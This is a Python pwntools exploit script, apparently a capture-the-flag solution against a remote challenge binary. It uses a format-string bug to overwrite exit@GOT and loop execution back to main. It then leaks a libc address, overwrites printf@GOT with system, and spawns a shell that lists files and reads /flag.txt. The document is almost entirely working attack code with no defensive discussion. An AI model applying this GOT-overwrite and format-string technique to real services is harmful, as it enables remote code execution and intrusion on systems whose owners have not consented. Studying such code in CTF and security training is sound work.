from pwn import *
import time

# nc stack.overflow.fail 9002
# exit@GOT 0x804a01c
# main 0x0804851b
r = remote("stack.overflow.fail", 9002)#process("./pwnable")#

r.recv(1204)
exit_got = 0x804a01c
main = 0x0804851b
print_got = 0x804a010
system_off = 0x03a940
stdin_off = 0x1b05a0
#### overwrite exit@GOT to restart execution ####
pad1 = int(hex(main)[-4:], 16) - 6
f = "BB" + p32(exit_got) + "%" + str(pad1) + "x%11$hn.%2$p"
r.sendline(f)
r.recvuntil(".")
r.sendline("%2$p")
leak = r.recvuntil("\n")
r.recvuntil("Give me a string to echo back.")
log.info("leaked: "+leak)
print hexdump(leak)
leak = int(leak[:-1],16)
libc_base = leak - stdin_off
log.info(hex(libc_base))
#### lets pwn now by override the printf@GOT with system #####
system = libc_base + system_off
log.info("evaluated system at: " + hex(system))
pad1 = int(hex(system)[-4:], 16) - 10
pad2 = int("1"+hex(system)[2:-4], 16)-pad1-10
f = "BB" + p32(print_got) + p32(print_got+2) + "%" + str(pad1) + "x%11$hn"  + "%" + str(pad2) + "x%12$hn"
r.sendline(f)
time.sleep(0.1)
r.sendline("sh")
r.sendline("ls -al;cat /flag.txt")
r.interactive()
